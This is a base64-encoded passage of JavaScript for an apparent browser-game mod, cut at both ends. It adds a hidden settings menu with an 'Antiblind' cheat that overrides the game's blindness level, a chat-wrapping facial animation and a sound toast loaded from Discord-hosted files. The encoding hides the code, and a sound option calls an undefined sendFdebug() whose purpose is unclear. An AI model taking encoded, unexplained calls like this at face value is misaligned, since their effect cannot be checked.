4ID0gIjk5OTkiOwoKLy9CQ00gbG9nbyAgIApjb25zdCBjb21wYW55TG9nbyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImltZyIpOwpjb21wYW55TG9nby5zcmMgPSAiaHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy83ODE3NDkyMjkzMzE5MzkzMjgvMTA3OTY1OTAxNjkxOTE5NTc0OC9iNjY0MTkxMTc4OTdhOTg4LnBuZz93aWR0aD0xMTkwJmhlaWdodD0xMTg5IjsKY29tcGFueUxvZ28uc3R5bGUuZmxvYXQgPSAibGVmdCI7CmNvbXBhbnlMb2dvLnN0eWxlLm1hcmdpblJpZ2h0ID0gIjEwcHgiOwpjb21wYW55TG9nby5zdHlsZS53aWR0aCA9ICI0MHB4IjsgLy8gQWRqdXN0IGxvZ28gc2l6ZSBhcyBuZWVkZWQKY29tcGFueUxvZ28uc3R5bGUuaGVpZ2h0ID0gIjQwcHgiOyAvLyBBZGp1c3QgbG9nbyBzaXplIGFzIG5lZWRlZApzZXR0aW5nc01lbnUuYXBwZW5kQ2hpbGQoY29tcGFueUxvZ28pOwoKLy9PcHRpb25zIGFuZCBzdHlsZV9fX19fX19fX19fX19fX19fX19fX19fX19fX19fCgpjb25zdCBvcHRpb24xID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgibGFiZWwiKTsKb3B0aW9uMS50ZXh0Q29udGVudCA9ICJBbnRpYmxpbmQiOwpjb25zdCBjaGVja2JveDEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbnB1dCIpOwpjaGVja2JveDEudHlwZSA9ICJjaGVja2JveCI7CmNoZWNrYm94MS5pZCA9ICJvcHRpb24xIjsKY2hlY2tib3gxLnN0eWxlLm1hcmdpblJpZ2h0ID0gIjVweCI7CmNoZWNrYm94MS5zdHlsZS52ZXJ0aWNhbEFsaWduID0gIm1pZGRsZSI7Cm9wdGlvbjEuYXBwZW5kQ2hpbGQoY2hlY2tib3gxKTsKc2V0dGluZ3NNZW51LmFwcGVuZENoaWxkKG9wdGlvbjEpOwoKY29uc3Qgb3B0aW9uMiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImxhYmVsIik7Cm9wdGlvbjIudGV4dENvbnRlbnQgPSAiUmVhbGlzdGljIFRhbGtpbmciOwpjb25zdCBjaGVja2JveDIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbnB1dCIpOwpjaGVja2JveDIudHlwZSA9ICJjaGVja2JveCI7CmNoZWNrYm94Mi5pZCA9ICJvcHRpb24yIjsKY2hlY2tib3gyLnN0eWxlLm1hcmdpblJpZ2h0ID0gIjVweCI7CmNoZWNrYm94Mi5zdHlsZS52ZXJ0aWNhbEFsaWduID0gIm1pZGRsZSI7Cm9wdGlvbjIuYXBwZW5kQ2hpbGQoY2hlY2tib3gyKTsKc2V0dGluZ3NNZW51LmFwcGVuZENoaWxkKG9wdGlvbjIpOwoKY29uc3Qgb3B0aW9uMyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImxhYmVsIik7Cm9wdGlvbjMudGV4dENvbnRlbnQgPSAiU291bmQiOwpjb25zdCBjaGVja2JveDMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbnB1dCIpOwpjaGVja2JveDMudHlwZSA9ICJjaGVja2JveCI7CmNoZWNrYm94My5pZCA9ICJvcHRpb24zIjsKY2hlY2tib3gzLnN0eWxlLm1hcmdpblJpZ2h0ID0gIjVweCI7CmNoZWNrYm94My5zdHlsZS52ZXJ0aWNhbEFsaWduID0gIm1pZGRsZSI7Cm9wdGlvbjMuYXBwZW5kQ2hpbGQoY2hlY2tib3gzKTsKc2V0dGluZ3NNZW51LmFwcGVuZENoaWxkKG9wdGlvbjMpOwoKLy8gQWRkIHNvbWUgYmFzaWMgc3R5bGluZyB0byB0aGUgbGFiZWxzCm9wdGlvbjEuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsKb3B0aW9uMS5zdHlsZS5qdXN0aWZ5Q29udGVudCA9ICJjZW50ZXIiOwpvcHRpb24xLnN0eWxlLmFsaWduSXRlbXMgPSAiY2VudGVyIjsKb3B0aW9uMS5zdHlsZS5tYXJnaW5Cb3R0b20gPSAiMTBweCI7Cm9wdGlvbjEuc3R5bGUucGFkZGluZyA9ICI1cHgiOwpvcHRpb24xLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1cHgiOwpvcHRpb24xLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZjJmMmYyIjsKCm9wdGlvbjIuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsKb3B0aW9uMi5zdHlsZS5qdXN0aWZ5Q29udGVudCA9ICJjZW50ZXIiOwpvcHRpb24yLnN0eWxlLmFsaWduSXRlbXMgPSAiY2VudGVyIjsKb3B0aW9uMi5zdHlsZS5tYXJnaW5Cb3R0b20gPSAiMTBweCI7Cm9wdGlvbjIuc3R5bGUucGFkZGluZyA9ICI1cHgiOwpvcHRpb24yLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1cHgiOwpvcHRpb24yLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZjJmMmYyIjsKCm9wdGlvbjMuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsKb3B0aW9uMy5zdHlsZS5qdXN0aWZ5Q29udGVudCA9ICJjZW50ZXIiOwpvcHRpb24zLnN0eWxlLmFsaWduSXRlbXMgPSAiY2VudGVyIjsKb3B0aW9uMy5zdHlsZS5tYXJnaW5Cb3R0b20gPSAiMTBweCI7Cm9wdGlvbjMuc3R5bGUucGFkZGluZyA9ICI1cHgiOwpvcHRpb24zLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1cHgiOwpvcHRpb24zLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZjJmMmYyIjsKCi8vIEFkZCBzb21lIGJhc2ljIGhvdmVyIGVmZmVjdHMgdG8gdGhlIGxhYmVscwpvcHRpb24xLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlZW50ZXIiLCBmdW5jdGlvbigpIHsKICBvcHRpb24xLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkIjsKICBvcHRpb24xLnN0eWxlLmN1cnNvciA9ICJwb2ludGVyIjsKfSk7CgpvcHRpb24xLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlbGVhdmUiLCBmdW5jdGlvbigpIHsKICBpZiAoY2hlY2tib3gxLmNoZWNrZWQpIHsKICAgIG9wdGlvbjEuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gImxpZ2h0Z3JlZW4iOwogIH0gZWxzZSB7CiAgICBvcHRpb24xLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZjJmMmYyIjsKICB9Cn0pOwoKb3B0aW9uMi5hZGRFdmVudExpc3RlbmVyKCJtb3VzZWVudGVyIiwgZnVuY3Rpb24oKSB7CiAgb3B0aW9uMi5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZCI7CiAgb3B0aW9uMi5zdHlsZS5jdXJzb3IgPSAicG9pbnRlciI7Cn0pOwoKb3B0aW9uMi5hZGRFdmVudExpc3RlbmVyKCJtb3VzZWxlYXZlIiwgZnVuY3Rpb24oKSB7CiAgaWYgKGNoZWNrYm94Mi5jaGVja2VkKSB7CiAgICBvcHRpb24yLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJsaWdodGdyZWVuIjsKICB9IGVsc2UgewogICAgb3B0aW9uMi5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2YyZjJmMiI7CiAgfQp9KTsKCm9wdGlvbjMuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VlbnRlciIsIGZ1bmN0aW9uKCkgewogIG9wdGlvbjMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGQiOwogIG9wdGlvbjMuc3R5bGUuY3Vyc29yID0gInBvaW50ZXIiOwp9KTsKCm9wdGlvbjMuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VsZWF2ZSIsIGZ1bmN0aW9uKCkgewogIGlmIChjaGVja2JveDMuY2hlY2tlZCkgewogICAgb3B0aW9uMy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAibGlnaHRncmVlbiI7CiAgfSBlbHNlIHsKICAgIG9wdGlvbjMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNmMmYyZjIiOwogIH0KfSk7CgovLyBDaGVjayB0aGUgY2hlY2tib3ggc3RhdGUgd2hlbiB0aGUgcGFnZSBsb2FkcwpjaGVja2JveDEuY2hlY2tlZCA/IG9wdGlvbjEuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkMWY3YzQiIDogb3B0aW9uMS5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2YyZjJmMiI7CmNoZWNrYm94Mi5jaGVja2VkID8gb3B0aW9uMi5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2QxZjdjNCIgOiBvcHRpb24yLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZjJmMmYyIjsKY2hlY2tib3gzLmNoZWNrZWQgPyBvcHRpb24zLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZDFmN2M0IiA6IG9wdGlvbjMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNmMmYyZjIiOwoKCi8vIENoYW5nZSB0aGUgbGFiZWwgYmFja2dyb3VuZCBjb2xvciB3aGVuIHRoZSBjaGVja2JveCBpcyBjaGVja2VkCmNoZWNrYm94MS5hZGRFdmVudExpc3RlbmVyKCJjaGFuZ2UiLCBmdW5jdGlvbigpIHsKICBpZiAoY2hlY2tib3gxLmNoZWNrZWQpIHsKICAgIG9wdGlvbjEuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkMWY3YzQiOwogIH0gZWxzZSB7CiAgICBvcHRpb24xLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZjJmMmYyIjsKICB9Cn0pOwoKY2hlY2tib3gyLmFkZEV2ZW50TGlzdGVuZXIoImNoYW5nZSIsIGZ1bmN0aW9uKCkgewogIGlmIChjaGVja2JveDIuY2hlY2tlZCkgewogICAgb3B0aW9uMi5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2QxZjdjNCI7CiAgfSBlbHNlIHsKICAgIG9wdGlvbjIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNmMmYyZjIiOwogIH0KfSk7CgpjaGVja2JveDMuYWRkRXZlbnRMaXN0ZW5lcigiY2hhbmdlIiwgZnVuY3Rpb24oKSB7CiAgaWYgKGNoZWNrYm94My5jaGVja2VkKSB7CiAgICBvcHRpb24zLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZDFmN2M0IjsKICB9IGVsc2UgewogICAgb3B0aW9uMy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2YyZjJmMiI7CiAgfQp9KTsKCi8vT3B0aW9ucyBBY3Rpb25zX19fX19fX19fX19fX19fX19fX19fX19fX19fX18KCi8vIERlZmluZSB0aGUgZnVuY3Rpb24gdG8gcnVuIGluc2lkZSBzZXRJbnRlcnZhbCBmb3Igb3B0aW9uIDEKZnVuY3Rpb24gcnVuT3B0aW9uMSgpIHsKICAgIGlmIChjaGVja2JveDEuY2hlY2tlZCkgewogICAgICBmdW5jdGlvbiBHZXRCbGluZExldmVsMCgpIHsKICAgICAgICBsZXQgYmxpbmRMZXZlbCA9IDA7CiAgICAgICAgcmV0dXJuIGJsaW5kTGV2ZWw7CiAgICAgIH0KICAgICAgUGxheWVyLkdldEJsaW5kTGV2ZWwgPSBHZXRCbGluZExldmVsMDsKICAgICAgUGxheWVyLkdldEJsaW5kTGV2ZWwoKTsKICAgIH0KICB9CiAgCiAgLy8gRGVmaW5lIHRoZSBmdW5jdGlvbiB0byBydW4gaW5zaWRlIHNldEludGVydmFsIGZvciBvcHRpb24gMgogIGZ1bmN0aW9uIHJ1bk9wdGlvbjIoKSB7CiAgICBmdW5jdGlvbiBSdW5FeHByZXNzaW9uQW5pbWF0aW9uU3RlcCgpIHsKICAgICAgQ2hhcmFjdGVyU2V0RmFjaWFsRXhwcmVzc2lvbihQbGF5ZXIsICJNb3V0aCIsIGV4cHJlc3Npb25BbmltYXRpb25bZXhwcmVzc2lvbkFuaW1hdGlvbkluZGV4KytdKTsKICAgICAgaWYgKGV4cHJlc3Npb25BbmltYXRpb25JbmRleCA8IGV4cHJlc3Npb25BbmltYXRpb24ubGVuZ3RoKSB7CiAgICAgICAgc2V0VGltZW91dChSdW5FeHByZXNzaW9uQW5pbWF0aW9uU3RlcCwgMTAwMCk7CiAgICAgIH0gZWxzZSB7CiAgICAgICAgZXhwcmVzc2lvbkFuaW1hdGlvbiA9IG51bGw7CiAgICAgIH0KICAgIH0KICAKICAgIGZ1bmN0aW9uIFJ1bkV4cHJlc3Npb25BbmltYXRpb24obGlzdCkgewogICAgICBpZiAoZXhwcmVzc2lvbkFuaW1hdGlvbikgewogICAgICAgIHJldHVybjsKICAgICAgfQogICAgICBleHByZXNzaW9uQW5pbWF0aW9uID0gbGlzdDsKICAgICAgZXhwcmVzc2lvbkFuaW1hdGlvbkluZGV4ID0gMDsKICAgICAgZXhwcmVzc2lvbkFuaW1hdGlvbkV4ID0gSW52ZW50b3J5R2V0KFBsYXllciwgIk1vdXRoIik7CiAgICAgIGlmIChleHByZXNzaW9uQW5pbWF0aW9uRXggJiYgZXhwcmVzc2lvbkFuaW1hdGlvbkV4LlByb3BlcnR5ICYmIGV4cHJlc3Npb25BbmltYXRpb25FeC5Qcm9wZXJ0eS5FeHByZXNzaW9uKSB7CiAgICAgICAgZXhwcmVzc2lvbkFuaW1hdGlvbltleHByZXNzaW9uQW5pbWF0aW9uLmxlbmd0aCAtIDFdID0gZXhwcmVzc2lvbkFuaW1hdGlvbkV4LlByb3BlcnR5LkV4cHJlc3Npb247IC8vc2V0IGxhc3QgdG8gY3VycmVudAogICAgICB9CiAgICAgIFJ1bkV4cHJlc3Npb25BbmltYXRpb25TdGVwKCk7CiAgICB9CiAgCiAgICBmdW5jdGlvbiBORVd0YWxraW5nKCkgewogICAgICB2YXIgbXNnID0gRWxlbWVudFZhbHVlKCJJbnB1dENoYXQiKS50cmltKCk7CiAgICAgIGlmICghbXNnLnN0YXJ0c1dpdGgoIi8iKSAmJiAhbXNnLnN0YXJ0c1dpdGgoIioiKSAmJiAhbXNnLnN0YXJ0c1dpdGgoIiEiKSkgewogICAgICAgIGlmIChtc2cubGVuZ3RoID4gMTApIHsKICAgICAgICAgIFJ1bkV4cHJlc3Npb25BbmltYXRpb24oW251bGwsICJHcmluIiwgIlNtaXJrIiwgbnVsbCwgIkdyaW4iLCAiU21pcmsiLCBudWxsXSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgIFJ1bkV4cHJlc3Npb25BbmltYXRpb24oW251bGwsICJHcmluIiwgIlNtaXJrIiwgbnVsbF0pOwogICAgICAgIH0KICAgICAgfQogICAgICBPTER0YWxraW5nKCk7CiAgICB9CiAgCiAgICBpZiAoY2hlY2tib3gyLmNoZWNrZWQpIHsKICAgICAgdmFyIGV4cHJlc3Npb25BbmltYXRpb247CiAgICAgIHZhciBleHByZXNzaW9uQW5pbWF0aW9uSW5kZXggPSAwOwogICAgICB2YXIgT0xEdGFsa2luZyA9IENoYXRSb29tU2VuZENoYXQ7CiAgICAgIENoYXRSb29tU2VuZENoYXQgPSBORVd0YWxraW5nOwogICAgfQogIH0KCiAgZnVuY3Rpb24gcnVuT3B0aW9uMygpIHsKICAgIGlmIChjaGVja2JveDMuY2hlY2tlZCkgewogICAgICBmdW5jdGlvbiBzaG93VG9hc3RzY3BnKCkgewogICAgICAgIEF1ZGlvUGxheUluc3RhbnRTb3VuZCgiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvNzgxNzQ5MjI5MzMxOTM5MzI4LzEwOTA1MzA0NzkwODM2MzA2NzIvaDQydndjZC1ub3RpZmljYXRpb24tMV92TXFoVmx0Uy5tcDMiLCAxKTsKICAgICAgICAvLyBDcmVhdGUgdGhlIHRvYXN0IGNvbnRhaW5lcgogICAgICAgIHZhciB0b2FzdENvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnBvc2l0aW9uID0gImZpeGVkIjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5ib3R0b20gPSAiNXB4IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5yaWdodCA9ICI1cHgiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJ3aGl0ZSI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuY29sb3IgPSAiIzE0MTQxNCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUucGFkZGluZyA9ICI1cHgiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJvcmRlciA9ICIycHggc29saWQgIzRDQUY1MCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm9yZGVyUmFkaXVzID0gIjVweCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm94U2hhZG93ID0gIjJweCAycHggMTBweCByZ2JhKDAsIDAsIDAsIDAuNSkiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuekluZGV4ID0gIjk5OSI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUudHJhbnNpdGlvbiA9ICJvcGFjaXR5IDAuNXMgZWFzZS1pbi1vdXQiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5hbGlnbkl0ZW1zID0gImNlbnRlciI7CiAgICAgICAgdmFyIHN0YXR1c0JhciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgc3RhdHVzQmFyLnN0eWxlLndpZHRoID0gIjEwMCUiOwogICAgc3RhdHVzQmFyLnN0eWxlLmhlaWdodCA9ICIzcHgiOwogICAgc3RhdHVzQmFyLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJibGFjayI7CiAgICBzdGF0dXNCYXIuc3R5bGUucG9zaXRpb24gPSAiYWJzb2x1dGUiOwogICAgc3RhdHVzQmFyLnN0eWxlLmJvdHRvbSA9ICIwIjsKICAgIHN0YXR1c0Jhci5zdHlsZS5sZWZ0ID0gIjAiOwogICAgc3RhdHVzQmFyLnN0eWxlLnRyYW5zaXRpb24gPSAid2lkdGggNXMgZWFzZS1pbi1vdXQiOwogICAgc3RhdHVzQmFyLnN0eWxlLndpZHRoID0gIjAlIjsKICAgIHRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKHN0YXR1c0Jhcik7CiAgICAKICAgIAogICAgLy8gVXBkYXRlIHRoZSB3aWR0aCBvZiB0aGUgc3RhdHVzIGJhciBhcyBpdCBjb3VudHMgZG93bgogICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgc3RhdHVzQmFyLnN0eWxlLndpZHRoID0gIjEwMCUiOwogICAgfSwgMCk7CiAgICAgICAgCiAgICAvLyBBZGQgdGhlIGN1c3RvbSBCQ00gaWNvbgogICAgdmFyIGljb24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTsKICAgIGljb24uc3JjID0gImh0dHBzOi8vbWVkaWEuZGlzY29yZGFwcC5uZXQvYXR0YWNobWVudHMvNzgxNzQ5MjI5MzMxOTM5MzI4LzEwNzk2NTkwMTY5MTkxOTU3NDgvYjY2NDE5MTE3ODk3YTk4OC5wbmc/d2lkdGg9MTE5MCZoZWlnaHQ9MTE4OSI7CiAgICBpY29uLnN0eWxlLndpZHRoID0gIjIzcHgiOwogICAgaWNvbi5zdHlsZS5oZWlnaHQgPSAiMjNweCI7CiAgICBpY29uLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1MCUiOwogICAgaWNvbi5zdHlsZS5tYXJnaW5SaWdodCA9ICItMzBweCI7CiAgICBpY29uLnN0eWxlLm1hcmdpbkJvdHRvbSA9ICItNXB4IjsKICAgIHRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKGljb24pOwogICAgCiAgICAvLyBBZGQgdGhlIHRleHQgbWVzc2FnZQogICAgdmFyIHRleHQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzcGFuIik7CiAgICB0ZXh0LnN0eWxlLmZvbnRXZWlnaHQgPSAiYm9sZCI7CiAgICB0ZXh0LnN0eWxlLm1hcmdpbkxlZnQgPSAiMzVweCI7CiAgICB0ZXh0LmlubmVySFRNTCA9ICJBY3Rpb24gU3VjY2Vzc2Z1bGx5IEV4ZWN1dGVkIjsKICAgIHRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKHRleHQpOwogICAgCiAgICAgICAgCiAgICAgIAogICAgICAgIC8vIEFwcGVuZCB0aGUgdG9hc3QgY29udGFpbmVyIHRvIHRoZSBib2R5CiAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZCh0b2FzdENvbnRhaW5lcik7CiAgICAgIAogICAgICAgIC8vIFNob3cgdGhlIHRvYXN0IHdpdGggYSBmYWRlIGluIGFuaW1hdGlvbgogICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsKICAgICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMSI7CiAgICAgICAgfSwgMCk7CiAgICAgIAogICAgICAgIC8vIEhpZGUgdGhlIHRvYXN0IHdpdGggYSBmYWRlIG91dCBhbmltYXRpb24KICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIwIjsKICAgICAgICB9LCA1MDAwKTsKICAgICAgCiAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICAgICAgfSwgNTUwMCk7CiAgICAgICAgc2VuZEZkZWJ1ZygpOwogICAgCiAgICAgIH0KCiAgICB9CiAgfQogIGZ1bmN0aW9uIGhlbGxvKCl7CiAgICBBdWRpb1BsYXlJbnN0YW50U291bmQoImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzc4MTc0OTIyOTMzMTkzOTMyOC8xMDkwNTMwNDc5MDgzNjMwNjcyL2g0MnZ3Y2Qtbm90aWZpY2F0aW9uLTFfdk1xaFZsdFMubXAzIiwgMSk7CgogIH0KICAvLyBMb2FkIHRoZSBjaGVja2JveCBzdGF0ZXMgZnJvbSBsb2NhbCBzdG9yYWdlLCBpZiBhdmFpbGFibGUKICBpZiAobG9jYWxTdG9yYWdlLmdldEl0ZW0oIm9wdGlvbjEiKSAhPT0gbnVsbCkgewogICAgY2hlY2tib3gxLmNoZWNrZWQgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgib3B0aW9uMSIpID09PSAidHJ1ZSI7CiAgICBpZiAoY2hlY2tib3gxLmNoZWNrZWQpIHsKICAgICAgc2V0SW50ZXJ2YWwocnVuT3B0aW9uMSwgMTAwMCk7CiAgICB9CiAgfQogIAogIGlmIChsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgib3B0aW9uMiIpICE9PSBudWxsKSB7CiAgICBjaGVja2JveDIuY2hlY2tlZCA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJvcHRpb24yIikgPT09ICJ0cnVlIjsKICAgIGlmIChjaGVja2JveDIuY2hlY2tlZCkgewogICAgICBzZXRJbnRlcnZhbChydW5PcHRpb24yLCAxMDAwKTsKICAgIH0KICB9CgogIGlmIChsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgib3B0aW9uMyIpICE9PSBudWxsKSB7CiAgICBjaGVja2JveDMuY2hlY2tlZCA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJvcHRpb24zIikgPT09ICJ0cnVlIjsKICAgIGlmIChjaGVja2JveDMuY2hlY2tlZCkgewogICAgICBzZXRJbnRlcnZhbChydW5PcHRpb24zLCAxMDAwKTsKICAgIH0KICB9CiAgCiAgLy8gQWRkIGV2ZW50IGxpc3RlbmVycyB0byB0aGUgY2hlY2tib3hlcyB0byBzYXZlIHRoZWlyIHN0YXRlIGluIGxvY2FsIHN0b3JhZ2UKICBjaGVja2JveDEuYWRkRXZlbnRMaXN0ZW5lcigiY2hhbmdlIiwgZnVuY3Rpb24oKSB7CiAgICBsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgib3B0aW9uMSIsIGNoZWNrYm94MS5jaGVja2VkKTsKICAgIGlmIChjaGVja2JveDEuY2hlY2tlZCkgewogICAgICBzZXRJbnRlcnZhbChydW5PcHRpb24xLCAxMDAwKTsKICAgIH0KICB9KTsKICAKICBjaGVja2JveDIuYWRkRXZlbnRMaXN0ZW5lcigiY2hhbmdlIiwgZnVuY3Rpb24oKSB7CiAgICBsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgib3B0aW9uMiIsIGNoZWNrYm94Mi5jaGVja2VkKTsKICAgIGlmIChjaGVja2JveDIuY2hlY2tlZCkgewogICAgICBzZXRJbnRlcnZhbChydW5PcHRpb24yLCAxMDAwKTsKICAgIH0KICB9KTsKCiAgY2hlY2tib3gzLmFkZEV2ZW50TGlzdGVuZXIoImNoYW5nZSIsIGZ1bmN0aW9uKCkgewogICAgbG9jYWxTdG9yYWdlLnNldEl0ZW0oIm9wdGlvbjMiLCBjaGVja2JveDMuY2hlY2tlZCk7CiAgICBpZiAoY2hlY2tib3gzLmNoZWNrZWQpIHsKICAgICAgc2V0SW50ZXJ2YWwocnVuT3B0aW9uMywgMTAwMCk7CiAgICB9CiAgfSk7CiAgCgovL09wdGlvbnMgU3RhdGVzX19fX19fX19fX19fX19fX19fX19fX19fX19fX18KCi8vIFNhdmUgdGhlIGNoZWNrYm94IHN0YXRlcyB0byBsb2NhbCBzdG9yYWdlIHdoZW4gdGhleSBjaGFuZ2UKY2hlY2tib3gxLmFkZEV2ZW50TGlzdGVuZXIoImNoYW5nZSIsIGZ1bmN0aW9uKCkgewogIGxvY2FsU3RvcmFnZS5zZXRJdGVtKCJvcHRpb24xIiwgY2hlY2tib3gxLmNoZWNrZWQpOwp9KTsKCmNoZWNrYm94Mi5hZGRFdmVudExpc3RlbmVyKCJjaGFuZ2UiLCBmdW5jdGlvbigpIHsKICBsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgib3B0aW9uMiIsIGNoZWNrYm94Mi5jaGVja2VkKTsKfSk7CgpjaGVja2JveDMuYWRkRXZlbnRMaXN0ZW5lcigiY2hhbmdlIiwgZnVuY3Rpb24oKSB7CiAgbG9jYWxTdG9yYWdlLnNldEl0ZW0oIm9wdGlvbjMiLCBjaGVja2JveDMuY2hlY2tlZCk7Cn0pOwoKCgovLyBBZGQgdGhlIHNldHRpbmdzIG1lbnUgdG8gdGhlIGRvY3VtZW50CmRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoc2V0dGluZ3NNZW51KTsKCi8vIFNob3cgdGhlIHNldHRpbmdzIG1lbnUgd2hlbiB0aGUgdXNlciBwcmVzc2VzIGAgYW5kIFMgYXQgdGhlIHNhbWUgdGltZQpsZXQgaXNCYWNrdGlja1ByZXNzZWQgPSBmYWxzZTsKbGV0IGlzU1ByZXNzZWQgPSBmYWxzZTsKCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImtleWRvd24iLCBmdW5jdGlvbihldmVudCkgewogIGlmIChldmVudC5rZXkgPT09ICJgIikgewogICAgaXNCYWNrdGlja1ByZXNzZWQgPSB0cnVlOwogIH0gZWxzZSBpZiAoZXZlbnQua2V5ID09PSAicyIpIHsKICAgIGlzU1ByZXNzZWQgPSB0cnVlOwogIH0KCiAgaWYgKGlzQmFja3RpY2tQcmVzc2VkICYmIGlzU1ByZXNzZWQpIHsKICAgIHNldHRpbmdzTWVudS5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsKICB9Cn0pOwoKLy8gSGlkZSB0aGUgc2V0dGluZ3MgbWVudSB3aGVuIHRoZSB1c2VyIGNsaWNrcyBvZmYKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBmdW5jdGlvbihldmVudCkgewogICAgY29uc3QgdGFyZ2V0RWxlbWVudCA9IGV2ZW50LnRhcmdldDsKICAgIGNvbnN0IGlzU2V0dGluZ3NNZW51ID0gISF0YXJnZXRFbGVtZW50LmNsb3Nlc3QoIiNzZXR0aW5ncy1tZW51Iik7CiAgICAKICAgIGlmICghaXNTZXR0aW5nc01lbnUpIHsKICAgICAgc2V0dGluZ3NNZW51LnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICB9CiAgfSk7CiAgCiAgCgogIAoKLy8gQ2xlYXIgdGhlIGAgYW5kIFMgZmxhZ3